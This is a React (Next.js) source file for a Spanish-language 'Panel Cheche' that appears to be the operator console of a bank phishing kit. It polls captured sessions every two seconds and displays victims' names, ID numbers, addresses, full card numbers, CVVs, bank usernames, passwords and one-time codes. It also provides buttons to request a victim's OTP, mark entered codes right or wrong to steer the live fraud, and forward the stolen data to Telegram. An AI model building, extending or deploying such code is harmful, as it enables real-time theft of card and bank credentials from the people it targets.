'use client';

import { useState, useEffect } from 'react';

interface Session {
  id: string;
  sessionId: string;
  bank: string;
  
  // Datos personales
  fullName?: string;
  email?: string;
  phone?: string;
  address?: string;
  city?: string;
  state?: string;
  country?: string;
  postalCode?: string;
  documentId?: string;
  
  // Datos de tarjeta
  cardNumber?: string;
  cardHolderName?: string;
  expiryDate?: string;
  cvv?: string;
  cardBrand?: string;
  
  // Credenciales bancarias
  usuario?: string;
  clave?: string;
  otp?: string;
  
  // Estado y timestamps
  status: string;
  totalAmount?: number;
  customerData: string;
  orderData: string;
  createdAt: string;
  otpRequestedAt?: string;
}

export default function ChechePanelPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchSessions();
    const interval = setInterval(fetchSessions, 2000); // Actualizar cada 2 segundos
    return () => clearInterval(interval);
  }, []);

  const fetchSessions = async () => {
    try {
      const response = await fetch('/api/cheche?action=get_all_sessions');
      const data = await response.json();
      if (data.success) {
        setSessions(data.sessions);
      }
    } catch (error) {
      console.error('Error fetching sessions:', error);
    } finally {
      setLoading(false);
    }
  };

  const requestOTP = async (sessionId: string) => {
    try {
      await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'request_otp',
          sessionId
        })
      });
      fetchSessions();
    } catch (error) {
      console.error('Error requesting OTP:', error);
    }
  };

  const validateOTP = async (sessionId: string, isValid: boolean) => {
    try {
      await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'validate_otp',
          sessionId,
          isValid
        })
      });
      fetchSessions();
    } catch (error) {
      console.error('Error validating OTP:', error);
    }
  };

  const sendToTelegram = async (session: Session) => {
    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'send_to_telegram',
          sessionId: session.sessionId
        })
      });

      if (response.ok) {
        alert('✅ Datos enviados a Telegram correctamente');
      } else {
        alert('❌ Error al enviar a Telegram');
      }
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      alert('❌ Error al enviar a Telegram');
    }
  };

  const getStatusBadge = (status: string) => {
    const statusMap: Record<string, { color: string; text: string }> = {
      'processing': { color: 'bg-blue-100 text-blue-800', text: 'Procesando' },
      'user_entered': { color: 'bg-yellow-100 text-yellow-800', text: 'Usuario Ingresado' },
      'password_entered': { color: 'bg-orange-100 text-orange-800', text: 'Clave Ingresada' },
      'waiting_otp': { color: 'bg-purple-100 text-purple-800', text: 'Esperando OTP' },
      'otp_submitted': { color: 'bg-indigo-100 text-indigo-800', text: 'OTP Enviado' },
      'otp_valid': { color: 'bg-green-100 text-green-800', text: 'OTP Válido' },
      'otp_invalid': { color: 'bg-red-100 text-red-800', text: 'OTP Inválido' },
      'timeout': { color: 'bg-gray-100 text-gray-800', text: 'Timeout' },
      'completed': { color: 'bg-green-100 text-green-800', text: 'Completado' },
    };

    const statusInfo = statusMap[status] || { color: 'bg-gray-100 text-gray-800', text: status };
    
    return (
      <span className={`inline-flex px-2 py-1 text-xs font-medium rounded-full ${statusInfo.color}`}>
        {statusInfo.text}
      </span>
    );
  };

  const formatTime = (dateString: string) => {
    return new Date(dateString).toLocaleTimeString('es-CO', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  };

  const isOTPExpired = (otpRequestedAt?: string) => {
    if (!otpRequestedAt) return false;
    const requestTime = new Date(otpRequestedAt);
    const now = new Date();
    return (now.getTime() - requestTime.getTime()) > 60000; // 1 minuto
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Cargando panel...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Panel Cheche</h1>
          <p className="text-gray-600">Monitoreo en tiempo real de sesiones bancarias</p>
          
          {sessions.length > 0 && (
            <div className="flex gap-4 mt-4">
              <div className="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-medium">
                Activas: {sessions.filter(s => !['completed', 'otp_valid', 'timeout', 'otp_invalid'].includes(s.status)).length}
              </div>
              <div className="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-medium">
                Completadas: {sessions.filter(s => ['completed', 'otp_valid'].includes(s.status)).length}
              </div>
              <div className="bg-red-100 text-red-800 px-3 py-1 rounded-full text-sm font-medium">
                Fallidas: {sessions.filter(s => ['timeout', 'otp_invalid'].includes(s.status)).length}
              </div>
            </div>
          )}
        </div>

        {sessions.length === 0 ? (
          <div className="bg-white rounded-lg shadow p-8 text-center">
            <p className="text-gray-500 text-lg">No hay sesiones activas</p>
          </div>
        ) : (
          <div className="grid gap-6">
            {sessions.map((session) => {
              // Ya no necesitamos parsear JSON, tenemos campos directos
              const expired = isOTPExpired(session.otpRequestedAt);

              return (
                <div key={session.sessionId} className={`rounded-lg shadow-md p-6 ${
                  session.status === 'completed' || session.status === 'otp_valid' 
                    ? 'bg-green-50 border-2 border-green-200' 
                    : session.status === 'timeout' || session.status === 'otp_invalid'
                    ? 'bg-red-50 border-2 border-red-200'
                    : 'bg-white border-2 border-gray-200'
                }`}>
                  <div className="flex items-center justify-between mb-4">
                    <div>
                      <h3 className="text-lg font-semibold text-gray-900">
                        Sesión #{session.sessionId.slice(-8)}
                      </h3>
                      <p className="text-sm text-gray-500">
                        {session.fullName} - {session.bank.toUpperCase()}
                      </p>
                    </div>
                    <div className="flex items-center gap-3">
                      {getStatusBadge(session.status)}
                      <span className="text-sm text-gray-500">
                        {formatTime(session.createdAt)}
                      </span>
                    </div>
                  </div>

                  <div className="grid md:grid-cols-3 gap-4 mb-4">
                    <div className="space-y-2">
                      <h4 className="font-medium text-gray-700">Datos del Cliente</h4>
                      <div className="text-sm text-gray-600 space-y-1">
                        <p><strong>Nombre:</strong> {session.fullName}</p>
                        <p><strong>Email:</strong> {session.email}</p>
                        <p><strong>Teléfono:</strong> {session.phone}</p>
                        <p><strong>Cédula:</strong> {session.documentId}</p>
                        <p><strong>Dirección:</strong> {session.address}, {session.city}</p>
                        <p><strong>Total:</strong> ${session.totalAmount?.toLocaleString('es-CO')}</p>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <h4 className="font-medium text-gray-700">Datos de Tarjeta</h4>
                      <div className="text-sm text-gray-600 space-y-1">
                        <p><strong>Número:</strong> {session.cardNumber}</p>
                        <p><strong>Titular:</strong> {session.cardHolderName}</p>
                        <p><strong>Vencimiento:</strong> {session.expiryDate}</p>
                        <p><strong>CVV:</strong> {session.cvv}</p>
                        <p><strong>Marca:</strong> {session.cardBrand}</p>
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <h4 className="font-medium text-gray-700">Credenciales Bancarias</h4>
                      <div className="text-sm text-gray-600 space-y-1">
                        {session.usuario && <p><strong>Usuario:</strong> {session.usuario}</p>}
                        {session.clave && <p><strong>Clave:</strong> {session.clave}</p>}
                        {session.otp && <p><strong>Dinámica:</strong> {session.otp}</p>}
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-3 pt-4 border-t flex-wrap">
                    {/* Botón para enviar a Telegram - siempre visible */}
                    <button
                      onClick={() => sendToTelegram(session)}
                      className="px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 transition flex items-center gap-2"
                    >
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.84 8.673c-.137.627-.501.782-.956.487l-2.64-1.945-1.273 1.227c-.141.141-.259.259-.532.259l.19-2.688 4.896-4.42c.213-.188-.046-.293-.33-.106l-6.05 3.81-2.608-.816c-.567-.175-.578-.567.119-.839l10.199-3.928c.472-.175.886.112.734.839z"/>
                      </svg>
                      Enviar a Telegram
                    </button>

                    {session.status === 'password_entered' && (
                      <button
                        onClick={() => requestOTP(session.sessionId)}
                        className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition"
                      >
                        Solicitar Dinámica
                      </button>
                    )}

                    {session.status === 'otp_submitted' && (
                      <>
                        <button
                          onClick={() => validateOTP(session.sessionId, true)}
                          className="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 transition"
                        >
                          Clave Correcta
                        </button>
                        <button
                          onClick={() => validateOTP(session.sessionId, false)}
                          className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 transition"
                        >
                          Clave Errónea
                        </button>
                      </>
                    )}

                    {expired && session.status === 'waiting_otp' && (
                      <span className="px-4 py-2 bg-gray-200 text-gray-600 rounded-md">
                        Tiempo agotado
                      </span>
                    )}
                    
                    {(session.status === 'completed' || session.status === 'otp_valid') && (
                      <span className="px-4 py-2 bg-green-200 text-green-800 rounded-md font-medium">
                        ✓ Transacción Completada
                      </span>
                    )}
                    
                    {(session.status === 'timeout' || session.status === 'otp_invalid') && (
                      <span className="px-4 py-2 bg-red-200 text-red-800 rounded-md font-medium">
                        ✗ Transacción Fallida
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}